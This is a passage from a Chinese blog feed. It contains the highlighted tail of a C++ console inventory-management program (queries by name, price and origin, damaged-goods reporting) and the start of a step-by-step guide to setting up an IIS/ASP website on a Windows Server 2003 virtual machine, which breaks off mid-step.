comment">//仓库编号</span>string kinds1<span class="token punctuation">;</span><span class="token comment">//生产产地</span>string shelfNo1<span class="token punctuation">;</span><span class="token comment">//货架号</span><span class="token keyword">long</span> count1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">//商品数量</span>ifstream <span class="token function">storeFile</span><span class="token punctuation">(</span><span class="token string">"m0re.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>storeFile<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> <span class="token string">"\t对不起，你的库存为空!!!"</span> <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> <span class="token string">"\t"</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">bool</span> flag <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> <span class="token string">"商品名 "</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"价格 "</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"商品数量 "</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"仓库编号 "</span><span class="token operator">&lt;&lt;</span> <span class="token string">"生产产地 "</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"货架号"</span> <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>storeFile <span class="token operator">>></span> name1 <span class="token operator">>></span> price1 <span class="token operator">>></span> count1 <span class="token operator">>></span> storeNo1 <span class="token operator">>></span> kinds1 <span class="token operator">>></span> shelfNo1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>name1 <span class="token operator">==</span> name<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>flag <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token function">setiosflags</span><span class="token punctuation">(</span>ios<span class="token operator">::</span>left<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token function">setw</span><span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> name1 <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token operator">&lt;&lt;</span> <span class="token function">setw</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> price1 <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span> <span class="token operator">&lt;&lt;</span> <span class="token function">setw</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> count1 <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token operator">&lt;&lt;</span> <span class="token function">setw</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> storeNo1 <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span> <span class="token operator">&lt;&lt;</span> <span class="token function">setw</span><span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> kinds1 <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token operator">&lt;&lt;</span> shelfNo1 <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>storeFile<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>flag<span class="token punctuation">)</span>cout <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> <span class="token string">"对不起，库存中没有这种商品!!!"</span><span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//按商品价格查询</span><span class="token keyword">void</span> mana<span class="token operator">::</span><span class="token function">select_price</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> <span class="token string">"\t按商品价格查询 : "</span> <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> endl <span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"\t输入价格 : "</span><span class="token punctuation">;</span><span class="token keyword">double</span> price<span class="token punctuation">;</span>cin <span class="token operator">>></span> price<span class="token punctuation">;</span>string name1<span class="token punctuation">;</span><span class="token comment">//商品名</span><span class="token keyword">double</span> price1<span class="token punctuation">;</span><span class="token comment">//价格</span>string storeNo1<span class="token punctuation">;</span><span class="token comment">//仓库编号</span>string kinds1<span class="token punctuation">;</span><span class="token comment">//生产产地</span>string shelfNo1<span class="token punctuation">;</span><span class="token comment">//货架号</span><span class="token keyword">long</span> count1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">//商品数量</span>ifstream <span class="token function">storeFile</span><span class="token punctuation">(</span><span class="token string">"m0re.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>storeFile<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> <span class="token string">"\t对不起，你的库存为空!!!"</span> <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> <span class="token string">"\t"</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">bool</span> flag <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> <span class="token string">"商品名 "</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"价格 "</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"商品数量 "</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"仓库编号 "</span><span class="token operator">&lt;&lt;</span> <span class="token string">"生产产地 "</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"货架号"</span> <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>storeFile <span class="token operator">>></span> name1 <span class="token operator">>></span> price1 <span class="token operator">>></span> count1 <span class="token operator">>></span> storeNo1 <span class="token operator">>></span> kinds1 <span class="token operator">>></span> shelfNo1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>price1 <span class="token operator">==</span> price<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>flag <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token function">setiosflags</span><span class="token punctuation">(</span>ios<span class="token operator">::</span>left<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token function">setw</span><span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> name1 <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token operator">&lt;&lt;</span> <span class="token function">setw</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> price1 <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span> <span class="token operator">&lt;&lt;</span> <span class="token function">setw</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> count1 <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token operator">&lt;&lt;</span> <span class="token function">setw</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> storeNo1 <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span> <span class="token operator">&lt;&lt;</span> <span class="token function">setw</span><span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> kinds1 <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token operator">&lt;&lt;</span> shelfNo1 <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>storeFile<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>flag<span class="token punctuation">)</span>cout <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> <span class="token string">"对不起，库存中没有这个价格的商品!!!"</span><span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//按产地查询</span><span class="token keyword">void</span> mana<span class="token operator">::</span><span class="token function">select_kind</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> <span class="token string">"\t按生产产地查询 : "</span> <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> endl <span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"\t输入产地名 : "</span><span class="token punctuation">;</span>string kinds<span class="token punctuation">;</span>cin <span class="token operator">>></span> kinds<span class="token punctuation">;</span>string name1<span class="token punctuation">;</span><span class="token comment">//商品名</span><span class="token keyword">double</span> price1<span class="token punctuation">;</span><span class="token comment">//价格</span>string storeNo1<span class="token punctuation">;</span><span class="token comment">//仓库编号</span>string kinds1<span class="token punctuation">;</span><span class="token comment">//生产产地</span>string shelfNo1<span class="token punctuation">;</span><span class="token comment">//货架号</span><span class="token keyword">long</span> count1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">//商品数量</span>ifstream <span class="token function">storeFile</span><span class="token punctuation">(</span><span class="token string">"m0re.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>storeFile<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> <span class="token string">"\t对不起，你的库存为空!!!"</span> <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> <span class="token string">"\t"</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">bool</span> flag <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> <span class="token string">"商品名 "</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"价格 "</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"商品数量 "</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"仓库编号 "</span><span class="token operator">&lt;&lt;</span> <span class="token string">"生产产地 "</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"货架号"</span> <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>storeFile <span class="token operator">>></span> name1 <span class="token operator">>></span> price1 <span class="token operator">>></span> count1 <span class="token operator">>></span> storeNo1 <span class="token operator">>></span> kinds1 <span class="token operator">>></span> shelfNo1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>kinds1 <span class="token operator">==</span> kinds<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>flag <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token function">setiosflags</span><span class="token punctuation">(</span>ios<span class="token operator">::</span>left<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token function">setw</span><span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> name1 <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token operator">&lt;&lt;</span> <span class="token function">setw</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> price1 <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span> <span class="token operator">&lt;&lt;</span> <span class="token function">setw</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> count1 <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token operator">&lt;&lt;</span> <span class="token function">setw</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> storeNo1 <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span> <span class="token operator">&lt;&lt;</span> <span class="token function">setw</span><span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> kinds1 <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token operator">&lt;&lt;</span> shelfNo1 <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>storeFile<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>flag<span class="token punctuation">)</span>cout <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> <span class="token string">"对不起，库存中没有这类商品!!!"</span><span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//商品报损</span><span class="token keyword">void</span> mana<span class="token operator">::</span><span class="token function">call_break</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>string name<span class="token punctuation">;</span><span class="token comment">//商品名</span>cout <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> <span class="token string">"\t商品报损，请输入要报损商品信息 : "</span> <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"\t商品名称 : "</span><span class="token punctuation">;</span>cin <span class="token operator">>></span> name<span class="token punctuation">;</span>ifstream <span class="token function">storeFile</span><span class="token punctuation">(</span><span class="token string">"m0re.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>storeFile<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>ofstream <span class="token function">storeFile1</span><span class="token punctuation">(</span><span class="token string">"m0re.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>storeFile1<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> <span class="token string">"\t仓存为空!!!!"</span> <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> <span class="token string">"\t"</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">bool</span> flag <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>string name1<span class="token punctuation">;</span><span class="token comment">//商品名</span><span class="token keyword">double</span> price1<span class="token punctuation">;</span><span class="token comment">//价格</span>string kinds1<span class="token punctuation">;</span><span class="token comment">//生产产地</span>string shelfNo1<span class="token punctuation">;</span><span class="token comment">//货架号</span><span class="token keyword">long</span> count1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">//商品数量</span>ofstream <span class="token function">tempFile</span><span class="token punctuation">(</span><span class="token string">"j4y.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>string storeNo1<span class="token punctuation">;</span><span class="token comment">//仓库编号</span>cout <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> <span class="token string">"你想报损商品信息如下 : "</span> <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> <span class="token string">"商品名 "</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"价格 "</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"商品数量 "</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"仓库编号 "</span><span class="token operator">&lt;&lt;</span> <span class="token string">"生产产地 "</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"货架号"</span> <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>storeFile <span class="token operator">>></span> name1 <span class="token operator">>></span> price1 <span class="token operator">>></span> count1 <span class="token operator">>></span> storeNo1 <span class="token operator">>></span> kinds1 <span class="token operator">>></span> shelfNo1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>name1<span class="token operator">==</span>name<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>flag <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token function">setiosflags</span><span class="token punctuation">(</span>ios<span class="token operator">::</span>left<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token function">setw</span><span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> name1 <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token operator">&lt;&lt;</span> <span class="token function">setw</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> price1 <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span> <span class="token operator">&lt;&lt;</span> <span class="token function">setw</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> count1 <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token operator">&lt;&lt;</span> <span class="token function">setw</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> storeNo1 <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span> <span class="token operator">&lt;&lt;</span> <span class="token function">setw</span><span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> kinds1 <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token operator">&lt;&lt;</span> shelfNo1 <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>shelfNo1 <span class="token operator">+=</span> <span class="token string">"(损坏)"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>tempFile <span class="token operator">&lt;&lt;</span> <span class="token function">setiosflags</span><span class="token punctuation">(</span>ios<span class="token operator">::</span>left<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token function">setw</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> name1 <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token operator">&lt;&lt;</span> <span class="token function">setw</span><span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> price1 <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span> <span class="token operator">&lt;&lt;</span> <span class="token function">setw</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> count1 <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token operator">&lt;&lt;</span> <span class="token function">setw</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> storeNo1 <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span> <span class="token operator">&lt;&lt;</span> <span class="token function">setw</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> kinds1 <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token operator">&lt;&lt;</span> shelfNo1 <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>tempFile<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>storeFile<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>flag<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> <span class="token string">"对不起，仓库中没有这种商品!!!"</span> <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>ofstream <span class="token function">storeFile1</span><span class="token punctuation">(</span><span class="token string">"m0re.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>ifstream <span class="token function">tempFile1</span><span class="token punctuation">(</span><span class="token string">"j4y.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>storeFile1 <span class="token operator">&lt;&lt;</span> tempFile1<span class="token punctuation">.</span><span class="token function">rdbuf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>storeFile1<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>tempFile1<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> <span class="token string">"这些商品已经损坏，请尽快从仓库中取出!!!"</span> <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"报损成功，记录已经更改!!!"</span> <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> endl <span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">char</span> select<span class="token punctuation">;</span>mana men<span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>select <span class="token operator">=</span> men<span class="token punctuation">.</span><span class="token function">first_face</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">switch</span> <span class="token punctuation">(</span>select<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">case</span> <span class="token string">'1'</span><span class="token operator">:</span>men<span class="token punctuation">.</span><span class="token function">in_storage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> <span class="token string">'2'</span><span class="token operator">:</span>men<span class="token punctuation">.</span><span class="token function">out_storage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> <span class="token string">'3'</span><span class="token operator">:</span>men<span class="token punctuation">.</span><span class="token function">select_ele</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> <span class="token string">'4'</span><span class="token operator">:</span>men<span class="token punctuation">.</span><span class="token function">call_break</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> <span class="token string">'5'</span><span class="token operator">:</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"\t"</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"谢谢使用!!!!"</span> <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> <span class="token string">"\t\t"</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">default</span><span class="token operator">:</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span></code></pre><p>还可以<a href="https://github.com/zxcv0221/m0re">点击这里</a>打包带走<br>演示图<br><img src="https://img-blog.csdnimg.cn/20200610193144931.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"></p>]]></content>
      
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一篇文章学会独立在win2003虚拟机上搭建网站</title>
      <link href="/posts/8fca646a/"/>
      <url>/posts/8fca646a/</url>
      
        <content type="html"><![CDATA[<p>本文学习：在Windows server 2003 虚拟机上的服务器搭建一个网站，非常详细，我都会了真的，有手就行。<br><code>Windows+iis+asp+access</code><br>环境：一台windows server 2003虚拟机。<br>准备工作什么也没有，开始搭建</p><h2 id="开始测试搭建"><a href="#开始测试搭建" class="headerlink" title="开始测试搭建"></a>开始测试搭建</h2><p>打开虚拟机，<br>1.点击开始<br><img src="https://img-blog.csdnimg.cn/20200428133927923.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>2.点击“管理您的服务器”<br><img src="https://img-blog.csdnimg.cn/20200428134049719.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>3.点击“添加或删除角色”<br><img src="https://img-blog.csdnimg.cn/2020042813412035.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>4.出现预备步骤，直接点击下一步<br>等待配置<br><img src="https://img-blog.csdnimg.cn/20200428134152520.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>5.配置结束后，点击“自定义配置”，下一步<br><img src="https://img-blog.csdnimg.cn/20200428134300902.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>6.选择第三个“应用程序服务器”，下一步<br><img src="https://img-blog.csdnimg.cn/2020042813433586.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>7.两个都勾选上，下一步<br><img src="https://img-blog.csdnimg.cn/20200428134408196.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>8.直接下一步！<br>9.等待配置组件<br><img 